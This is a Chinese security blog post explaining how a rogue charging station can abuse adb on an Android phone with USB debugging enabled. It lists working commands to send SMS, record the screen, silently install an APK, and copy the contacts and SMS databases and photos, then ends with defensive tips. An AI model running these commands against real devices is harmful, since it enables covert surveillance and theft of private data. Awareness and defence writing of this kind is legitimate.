---
layout: post
title: adb指令渗透手机获取隐私信息
date: 2017-03-17 11:00:20
comments: true
tags:
	- 安全攻防
	- 安卓
---

### 前言
><font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>

### 正文
>前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。<!--more-->
>前提就是必须开了usb调试模式，一旦开启并允许adb调试的话，就等同于让你的手机权限拱手让人了。

#### 发送短信
> 控制受害者手机发送短信，这个只需要三条命令就可以达到。<br/>
>  打开了短信应用程序，当前焦点在文本框
>  * adb shell am start -a android.intent.action.SENDTO -d sms:10086 --es sms_body "hello" --ez exit_on_sent true
>  焦点去到发送按键
>  * adb shell input keyevent 22  
>  回车，就是按下发送键
>  * adb shell input keyevent 66  

>![](/images/pasted-45.jpg)

#### 监视受害者手机
> 对受害者手机屏幕录屏，然后从手机传输到电脑。<br/>
> * adb shell screenrecord /sdcard/test.mp4
> 录制完毕后再从手机传输到电脑中
> * adb pull /sdcard/test.mp4 d:\test.mp4
> 其中如果全分辨率录制的会视频会比较大，如果受害者手机是2k的，那么就更大了，所以建议设置一下分辨率。
> * adb shell screenrecord --size 848x480 /sdcard/test.mp4

>![](/images/pasted-46.jpg)

#### 静默安装程序
> 将恶意程序静默安装在受害者手机内。
>  * adb install d:/test.apk
> 打开启动程序
>  * adb shell am start -n hk.myapplication/hk.myapplication.MainActivity
> hk.myapplication为包名，hk.myapplication.MainActivity为Activity的路径.

>![](/images/pasted-47.jpg)

#### 窃取通讯录短信等隐私。
> 作为安卓开发者我们都知道手机的短信通讯录等都存在手机的数据库中。
> 我们把数据库拷贝到电脑就相当于获取到了受害者的通讯录短信。
> 通讯录和通话记录的数据库存放在
> `/data/data/com.android.providers.contacts/databases/contacts2.db`
> 短信的数据库存放在
> `/data/data/com.android.providers.telephony/databases/mmssms.db`
> ps: 不知道是我手机原因还是什么原因，adb pull 不能直接拷贝到电脑，然后adb shell进入命令模式，先把数据库拷贝到sdcard中，然后再adb pull就成功拷贝了。
> 另外所有安卓手机中，我们手机拍摄的照片都会保存在`/sdcard/DCIM`这个文件夹中，我们adb pull这个文件夹，受害者在生活照所拍摄的照片和视频全部都可以获取到。

#### 末尾
> 这些危害都是在受害者连接usb后触发的，而且攻击过程受害者是完全感觉不到的。希望大家务必做好防范措施
> * 不要使用安全性未知的数据线连接自己的手机。
> * 在非需要调试的情况下，不要开启adb调试。
> * 安装可靠的手机杀毒软件。